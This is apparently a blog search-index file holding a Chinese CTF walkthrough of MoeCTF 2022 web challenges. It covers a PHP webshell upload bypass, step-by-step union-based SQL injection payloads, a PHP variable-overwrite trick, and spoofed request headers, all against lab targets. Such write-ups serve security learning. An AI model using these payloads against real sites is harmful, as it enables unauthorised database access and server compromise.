<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/posts/1.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>MoeCTF_2022web</title>
    <url>/posts/35880.html</url>
    <content><![CDATA[<p>MoeCTF_2022web方向WP</p>
<span id="more"></span>
<h1 id="what-are-y0u-uploading？"><a href="#what-are-y0u-uploading？" class="headerlink" title="what are y0u uploading？"></a>what are y0u uploading？</h1><p><img src="https://pic1.imgdb.cn/item/67ba911bd0e0a243d4025fcc.png"><br>文件上传题目，先随便上传一个正常的一句话木马的php文件，看看有什么限制<br>提示只能上传图片类型文件，然后打开bp，现在本机把文件改成jpg格式，然后bp中修改后缀看看是不是在前端做校验<br>修改后缀后成功上传了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">文件上传成功！filename：<span class="number">2</span><span class="selector-class">.php</span></span><br><span class="line">我不想要这个特洛伊文件，给我一个f1ag<span class="selector-class">.php</span> 我就给你flag!</span><br></pre></td></tr></table></figure></div>
<p>那我们就新建一个f1ag.jpg文件然后改成php上传给他，拿到flag<br><img src="https://pic1.imgdb.cn/item/67ba92c4d0e0a243d402603a.png"></p>
<h1 id="Sqlmap-boy"><a href="#Sqlmap-boy" class="headerlink" title="Sqlmap_boy"></a>Sqlmap_boy</h1><p><img src="https://pic1.imgdb.cn/item/67ba92ffd0e0a243d4026046.png"><br>一个登录界面，根据题目的意思用sqlmap工具可以直接一把梭？<br>随便输入一个账号密码然后bp抓包， 用sql跑一下  没跑出来<br>在页面的源代码发现有提示，这是sql查询语句的源代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $sql = &#x27;select username,password from users where username=&quot;&#x27;.$username.&#x27;&quot; &amp;&amp; password=&quot;&#x27;.$password.&#x27;&quot;;&#x27;; --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>那就可以在username这里闭合 输入<code>admin&quot; #</code>跳转到<code>http://node5.anna.nssctf.cn:27698/secrets.php?id=1</code><br>这里就有注入点了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>爆库</span><br><span class="line">?id=<span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 -- + </span></span><br><span class="line"><span class="string">moectf</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.爆表</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- + </span></span><br><span class="line">articles,flag,users</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>爆字段</span><br><span class="line">?id=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27; -- + </span></span><br><span class="line"><span class="string">flAg</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.爆值</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(flAg),<span class="number">3</span> <span class="keyword">from</span> flag <span class="comment">-- + </span></span><br><span class="line">NSSCTF&#123;<span class="number">4e6</span>ccb7d<span class="number">-4</span>dc7<span class="number">-417</span>c<span class="number">-839</span>b<span class="number">-7522e2460305</span>&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="God-of-aim"><a href="#God-of-aim" class="headerlink" title="God_of_aim"></a>God_of_aim</h1><p><img src="https://pic1.imgdb.cn/item/67baaa3ad0e0a243d4026c87.png"><br>源代码中有一个注释 <code>  &lt;!-- 你知道吗？index.js实例化了一个aimTrainer对象--&gt;</code><br>在源代码中点击aimtrainer.js界面看源代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="WREN"><figure class="iseeu highlight /wren"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">_0x78bd</span> <span class="operator">=</span> [<span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x54</span><span class="char escape_">\x72</span><span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6E</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span><span class="char escape_">\x45</span><span class="char escape_">\x6C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x2D</span><span class="char escape_">\x74</span><span class="char escape_">\x72</span><span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6E</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x67</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x45</span><span class="char escape_">\x6C</span><span class="char escape_">\x65</span><span class="char escape_">\x6D</span><span class="char escape_">\x65</span><span class="char escape_">\x6E</span><span class="char escape_">\x74</span><span class="char escape_">\x42</span><span class="char escape_">\x79</span><span class="char escape_">\x49</span><span class="char escape_">\x64</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x45</span><span class="char escape_">\x6C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x64</span><span class="char escape_">\x65</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x79</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x74</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x67</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x53</span><span class="char escape_">\x69</span><span class="char escape_">\x7A</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x45</span><span class="char escape_">\x4C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x53</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x74</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x69</span><span class="char escape_">\x6E</span><span class="char escape_">\x6E</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span><span class="char escape_">\x48</span><span class="char escape_">\x54</span><span class="char escape_">\x4D</span><span class="char escape_">\x4C</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span><span class="char escape_">\x41</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x53</span><span class="char escape_">\x63</span><span class="char escape_">\x6F</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x70</span><span class="char escape_">\x6F</span><span class="char escape_">\x73</span><span class="char escape_">\x69</span><span class="char escape_">\x74</span><span class="char escape_">\x69</span><span class="char escape_">\x6F</span><span class="char escape_">\x6E</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x79</span><span class="char escape_">\x6C</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x74</span><span class="char escape_">\x69</span><span class="char escape_">\x76</span><span class="char escape_">\x65</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x74</span><span class="char escape_">\x69</span><span class="char escape_">\x6D</span><span class="char escape_">\x65</span><span class="char escape_">\x72</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x63</span><span class="char escape_">\x72</span><span class="char escape_">\x65</span><span class="char escape_">\x61</span><span class="char escape_">\x74</span><span class="char escape_">\x65</span><span class="char escape_">\x54</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x67</span><span class="char escape_">\x65</span><span class="char escape_">\x74</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x63</span><span class="char escape_">\x68</span><span class="char escape_">\x65</span><span class="char escape_">\x63</span><span class="char escape_">\x6B</span><span class="char escape_">\x66</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x67</span><span class="char escape_">\x31</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x63</span><span class="char escape_">\x68</span><span class="char escape_">\x65</span><span class="char escape_">\x63</span><span class="char escape_">\x6B</span><span class="char escape_">\x66</span><span class="char escape_">\x6C</span><span class="char escape_">\x61</span><span class="char escape_">\x67</span><span class="char escape_">\x32</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x6F</span><span class="char escape_">\x70</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x6D</span><span class="char escape_">\x6F</span><span class="char escape_">\x65</span><span class="char escape_">\x63</span><span class="char escape_">\x74</span><span class="char escape_">\x66</span><span class="char escape_">\x7B</span><span class="char escape_">\x4F</span><span class="char escape_">\x68</span><span class="char escape_">\x5F</span><span class="char escape_">\x79</span><span class="char escape_">\x6F</span><span class="char escape_">\x75</span><span class="char escape_">\x5F</span><span class="char escape_">\x63</span><span class="char escape_">\x61</span><span class="char escape_">\x6E</span><span class="char escape_">\x5F</span><span class="char escape_">\x61</span><span class="char escape_">\x31</span><span class="char escape_">\x6D</span><span class="char escape_">\x5F</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\u4F60</span><span class="char escape_">\u5DF2</span><span class="char escape_">\u7ECF</span><span class="char escape_">\u5B66</span><span class="char escape_">\u4F1A</span><span class="char escape_">\u7784</span><span class="char escape_">\u51C6</span><span class="char escape_">\u4E86</span><span class="char escape_">\uFF01</span><span class="char escape_">\u8BD5</span><span class="char escape_">\u8BD5</span><span class="char escape_">\u770B</span><span class="char escape_">\x3A</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x73</span><span class="char escape_">\x74</span><span class="char escape_">\x61</span><span class="char escape_">\x72</span><span class="char escape_">\x74</span><span class="char escape_">\x32</span>&quot;</span>, <span class="string">&quot;<span class="char escape_">\x61</span><span class="char escape_">\x6E</span><span class="char escape_">\x64</span><span class="char escape_">\x5F</span><span class="char escape_">\x48</span><span class="char escape_">\x34</span><span class="char escape_">\x63</span><span class="char escape_">\x6B</span><span class="char escape_">\x5F</span><span class="char escape_">\x4A</span><span class="char escape_">\x61</span><span class="char escape_">\x76</span><span class="char escape_">\x61</span><span class="char escape_">\x73</span><span class="char escape_">\x63</span><span class="char escape_">\x72</span><span class="char escape_">\x69</span><span class="char escape_">\x70</span><span class="char escape_">\x74</span><span class="char escape_">\x7D</span>&quot;</span>, <span class="string">&quot;&quot;</span>];</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AimTrainer</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(&#123;_0<span class="params">xf777x2</span>, _0<span class="params">xf777x3</span>&#125;) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]] <span class="operator">=</span> <span class="variable">document</span>[<span class="variable">_0x78bd</span>[<span class="number">2</span>]](<span class="variable">_0x78bd</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]] <span class="operator">=</span> <span class="variable">document</span>[<span class="variable">_0x78bd</span>[<span class="number">2</span>]](<span class="variable">_0x78bd</span>[<span class="number">4</span>]);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]] <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]] <span class="operator">=</span> <span class="variable">_0xf777x2</span> <span class="operator">||</span> <span class="number">1000</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">7</span>]] <span class="operator">=</span> <span class="variable">_0xf777x3</span> <span class="operator">||</span> <span class="number">30</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">8</span>]] <span class="operator">=</span> <span class="variable">document</span>[<span class="variable">_0x78bd</span>[<span class="number">2</span>]](<span class="variable">_0x78bd</span>[<span class="number">5</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createTarget</span>() &#123;</span><br><span class="line">        <span class="variable">const</span> <span class="variable">_0xf777x5</span> <span class="operator">=</span> <span class="variable">new</span> <span class="title class_">Target</span>(&#123;</span><br><span class="line">            <span class="variable">delay</span>: <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]],</span><br><span class="line">            <span class="variable">targetSize</span>: <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">7</span>]],</span><br><span class="line">            <span class="variable">aimTrainerEl</span>: <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]],</span><br><span class="line">            <span class="variable">onTargetHit</span>: () <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">9</span>]](<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">+</span> <span class="number">1</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable">_0xf777x5</span>[<span class="variable">_0x78bd</span>[<span class="number">10</span>]]()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setScore</span>(_0<span class="params">xf777x7</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">=</span> <span class="variable">_0xf777x7</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setAimScore</span>(_0<span class="params">xf777x7</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]] <span class="operator">=</span> <span class="variable">_0xf777x7</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">8</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable">_0xf777x7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">start1</span>() &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">9</span>]](<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">12</span>]](<span class="number">10</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]][<span class="variable">_0x78bd</span>[<span class="number">14</span>]][<span class="variable">_0x78bd</span>[<span class="number">13</span>]] <span class="operator">=</span> <span class="variable">_0x78bd</span>[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span><span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]] <span class="operator">=</span> <span class="title function_">setInterval</span>( () <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">17</span>]]();</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]];</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">18</span>]]()</span><br><span class="line">            &#125;</span><br><span class="line">            , <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">start2</span>() &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">7</span>]] <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]] <span class="operator">=</span> <span class="number">400</span>;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">9</span>]](<span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">12</span>]](<span class="number">100000</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]][<span class="variable">_0x78bd</span>[<span class="number">14</span>]][<span class="variable">_0x78bd</span>[<span class="number">13</span>]] <span class="operator">=</span> <span class="variable">_0x78bd</span>[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span><span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]] <span class="operator">=</span> <span class="title function_">setInterval</span>( () <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">17</span>]]();</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">3</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]];</span><br><span class="line">                <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">19</span>]]()</span><br><span class="line">            &#125;</span><br><span class="line">            , <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">6</span>]])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">checkflag1</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">==</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">20</span>]]();</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable">_0x78bd</span>[<span class="number">21</span>]);</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable">_0x78bd</span>[<span class="number">22</span>]);</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">23</span>]]()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">checkflag2</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">4</span>]] <span class="operator">==</span> <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">5</span>]]) &#123;</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">20</span>]]();</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable">_0x78bd</span>[<span class="number">24</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">stop</span>() &#123;</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">0</span>]][<span class="variable">_0x78bd</span>[<span class="number">11</span>]] <span class="operator">=</span> <span class="variable">_0x78bd</span>[<span class="number">25</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]) &#123;</span><br><span class="line">            <span class="title function_">clearInterval</span>(<span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]]);</span><br><span class="line">            <span class="variable language_">this</span>[<span class="variable">_0x78bd</span>[<span class="number">16</span>]] <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里有两个checkflag函数，都是执行了alert函数在控制台中输入，得到一半的flag<br><img src="https://pic1.imgdb.cn/item/67baab6bd0e0a243d4026d17.png"><br>再输入第二个checkflag中的alert函数得到另一半flag<br><img src="https://pic1.imgdb.cn/item/67baabadd0e0a243d4026d2d.png"><br>如果在NSS中做题前面要改成NSSCTF</p>
<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这是一道变量覆盖的题，必须用get和post传入flag参数，但是值不能都是flag<br>然后foreach中的内容意思是把其中的键值对转换为变量，例如，如果请求是 POST flag&#x3D;123，那么 <code>$flag</code> &#x3D; ‘123’;<br>这里最后一个覆盖是get请求，我们就利用一个中间的变量x，让x&#x3D;flag,这样子x就会变成我们需要的最原始的flag<br>然后再让flag&#x3D;x 这样子就避免了最初的flag被我们输入的flag覆盖了<br><img src="https://pic1.imgdb.cn/item/67bab120d0e0a243d4026ed8.png"></p>
<h1 id="ezhtml"><a href="#ezhtml" class="headerlink" title="ezhtml"></a>ezhtml</h1><p><img src="https://pic1.imgdb.cn/item/67bab1d9d0e0a243d4026ef0.png"><br>查看源代码，最有有一个evil.js这是校验逻辑，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sx = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#sx&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> yw = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#yw&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> wy = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#wy&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> zh = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#zh&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> zf = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#zf&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> arr = [sx, yw, wy, zh];</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        sum += <span class="built_in">eval</span>(arr[i].<span class="property">innerHTML</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sum == <span class="built_in">eval</span>(zf.<span class="property">innerHTML</span>) &amp;&amp; sum &gt; <span class="number">600</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;NSSCTF&#123;91e26cae-0c3a-40c2-b6b8-9a7ffb431d26&#125;&#x27;</span>);</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> timer = <span class="built_in">setInterval</span>(check, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></div>
<p>直接得到flag了，这里还要sum大于600，我们也可以按f12修改这些成绩,要把单科和总分一起改，总分要等于总和<br><img src="https://pic1.imgdb.cn/item/67bab445d0e0a243d4026f61.png"></p>
<h1 id="cookiehead"><a href="#cookiehead" class="headerlink" title="cookiehead"></a>cookiehead</h1><p>题目界面只有<code>仅限本地访问</code><br>就在请求头这里加入xff 伪造本地<br>然后提示<code>You are not from http://127.0.0.1/index.php !</code><br>所以加上Referer<br>最后提示<code>请先登录</code><br>再把login 改成1</p>
